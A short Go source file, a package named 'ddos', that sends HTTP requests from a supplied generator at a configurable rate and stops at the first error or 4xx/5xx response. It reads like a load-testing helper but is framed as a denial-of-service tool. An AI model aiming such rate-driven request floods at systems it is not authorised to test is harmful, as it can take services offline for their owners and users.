package ddos

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"time"
)

type Client struct {
	HTTPClient *http.Client
}

func NewClient(timeout time.Duration) (*Client, error) {
	var c Client

	c.HTTPClient = &http.Client{
		Timeout: timeout,
	}

	return &c, nil
}

type RequestGenerator func(ctx context.Context) (*http.Request, error)

func (c *Client) DDoS(ctx context.Context, requestGenerator RequestGenerator, rate int) error {
	pingErrc := make(chan error, 1)
	delay := time.Second / time.Duration(rate)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case err := <-pingErrc:
			return err
		default:
			req, err := requestGenerator(ctx)
			if err != nil {
				return fmt.Errorf("error generating request: %v", err)
			}

			go c.ping(pingErrc, req)

			time.Sleep(delay)
		}
	}
}

func (c *Client) ping(errc chan<- error, req *http.Request) {
	res, err := c.HTTPClient.Do(req)
	if err != nil {
		errc <- fmt.Errorf("error sending \"%s %s\" request: %v", req.Method, req.URL, err)
		return
	}
	defer res.Body.Close()

	if res.StatusCode >= 400 {
		errc <- fmt.Errorf("%s %s => %s", req.Method, req.URL, res.Status)
		return
	}

	log.Printf("%s %s => %s", req.Method, req.URL, res.Status)
}
